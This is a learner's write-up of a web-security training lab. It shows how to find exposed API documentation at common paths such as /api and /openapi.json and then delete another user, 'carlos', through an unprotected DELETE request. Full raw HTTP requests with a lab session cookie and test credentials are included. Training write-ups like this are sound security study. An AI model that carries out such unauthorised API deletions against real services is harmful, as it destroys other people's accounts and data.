# Lab - 01 : Exploiting an API endpoint using documentation

Topic :  Exploiting an API endpoint using documentation

Concept:  Reading through the documentation of the API and exploiting it.

End Goal : Deleting the user carlos

Analysis : 

- Check some common endpoints for finding api documentation.
    - IDEA → This can be automated using a script
- Some common endpoints are :
    - `/swagger/index.html`
    - `/openapi.json`
    - `/api/swagger/v1`
    - `/api/swagger`
    - `/api`
        - Note: **SWAGGER** is a popular api documentation tool.
- Given user credentials `wiener:peter`
- On the website, during recon, i found out that when trying to change the email, the website calls an API. The request is as follows :

```
PATCH /api/user/wiener HTTP/2
Host: 0a1900470369b05280ef21c000ea000e.web-security-academy.net
Cookie: session=dDf9LvNMWwocNu81DwSwc5VytBQDx9Qa
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a1900470369b05280ef21c000ea000e.web-security-academy.net/my-account
Content-Type: text/plain;charset=UTF-8
Content-Length: 21
Origin: https://0a1900470369b05280ef21c000ea000e.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

{"email":"qw@qw.com"}
```

- Here we can see that the endpoint is `/api/user/wiener` . Let’s find the documentation to this api now.
- Notable details :
    - PATCH request
    - body - params : **email**
- Found the documentation at `/api` endpoint

![image.png](Lab%20-%2001%20Exploiting%20an%20API%20endpoint%20using%20document%2026a3c5d54c76804d9cdce2a4a1ebfa70/image.png)

- So, to delete the user carlos, we have to make this request to the api.

```
DELETE /api/user/carlos [goal is to delete carlos]
```

- Final request
    
    ```
    DELETE /api/user/carlos HTTP/2
    Host: 0a1900470369b05280ef21c000ea000e.web-security-academy.net
    Cookie: session=dDf9LvNMWwocNu81DwSwc5VytBQDx9Qa
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate, br
    Referer: https://0a1900470369b05280ef21c000ea000e.web-security-academy.net/my-account
    Content-Type: text/plain;charset=UTF-8
    Content-Length: 0
    Origin: https://0a1900470369b05280ef21c000ea000e.web-security-academy.net
    Sec-Fetch-Dest: empty
    Sec-Fetch-Mode: cors
    Sec-Fetch-Site: same-origin
    Priority: u=0
    Te: trailers
    ```
    
- This solves tha lab.